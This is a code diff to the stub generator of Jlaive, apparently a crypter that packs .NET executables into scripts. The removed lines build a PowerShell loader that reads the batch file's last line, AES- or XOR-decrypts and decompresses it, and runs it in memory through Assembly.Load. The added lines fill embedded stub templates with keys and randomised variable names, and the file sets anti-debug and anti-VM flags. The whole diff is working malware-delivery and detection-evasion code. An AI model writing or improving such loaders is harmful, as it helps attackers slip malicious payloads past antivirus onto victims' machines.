@@ -9,21 +9,48 @@ namespace Jlaive
 {
     public class StubGen
     {
-        public static (string, string) CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
+        public static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
         {
-            string varname = RandomString(6, rng);
-            string varname2 = RandomString(6, rng);
-            string srcvarname = RandomString(6, rng);
-            string base64name = RandomString(6, rng);
-            string classname = RandomString(6, rng);
-            string functionname = RandomString(6, rng);
-            string functionname2 = RandomString(6, rng);
-            string decryptioncode;
-            if (mode == EncryptionMode.XOR) decryptioncode = "for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ key[i % key.Length]); } return input;";
-            else decryptioncode = "AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted;";
-            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, byte[] key, byte[] iv) { " + decryptioncode + @" } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
-            string command = $"${varname} = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${base64name}));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
-            return ($"${base64name} = '{srcclass}';", command);
+            string contents_var = RandomString(5, rng);
+            string lastline_var = RandomString(5, rng);
+            string payload_var = RandomString(5, rng);
+            string key_var = RandomString(5, rng);
+            string aes_var = RandomString(5, rng);
+            string decryptor_var = RandomString(5, rng);
+            string msi_var = RandomString(5, rng);
+            string mso_var = RandomString(5, rng);
+            string gs_var = RandomString(5, rng);
+
+            if (mode == EncryptionMode.AES)
+            {
+                string stubcode = GetEmbeddedString("Jlaive.Resources.AESStub.ps1");
+                stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
+                stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
+                stubcode = stubcode.Replace("contents_var", contents_var);
+                stubcode = stubcode.Replace("lastline_var", lastline_var);
+                stubcode = stubcode.Replace("payload_var", payload_var);
+                stubcode = stubcode.Replace("aes_var", aes_var);
+                stubcode = stubcode.Replace("decryptor_var", decryptor_var);
+                stubcode = stubcode.Replace("msi_var", msi_var);
+                stubcode = stubcode.Replace("mso_var", mso_var);
+                stubcode = stubcode.Replace("gs_var", gs_var);
+                stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
+                return stubcode;
+            }
+            else
+            {
+                string stubcode = GetEmbeddedString("Jlaive.Resources.XORStub.ps1");
+                stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
+                stubcode = stubcode.Replace("contents_var", contents_var);
+                stubcode = stubcode.Replace("lastline_var", lastline_var);
+                stubcode = stubcode.Replace("payload_var", payload_var);
+                stubcode = stubcode.Replace("key_var", key_var);
+                stubcode = stubcode.Replace("msi_var", msi_var);
+                stubcode = stubcode.Replace("mso_var", mso_var);
+                stubcode = stubcode.Replace("gs_var", gs_var);
+                stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
+                return stubcode;
+            }
         }
 
         public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
@@ -54,7 +81,7 @@ namespace Jlaive
             string iv_str = Convert.ToBase64String(iv);
 
             string stub = string.Empty;
-            string stubcode = Encoding.UTF8.GetString(GetEmbeddedResource("Jlaive.Resources.Stub.cs"));
+            string stubcode = GetEmbeddedString("Jlaive.Resources.Stub.cs");
 
             if (antidebug) stub += "#define ANTI_DEBUG\n";
             if (antivm) stub += "#define ANTI_VM\n";
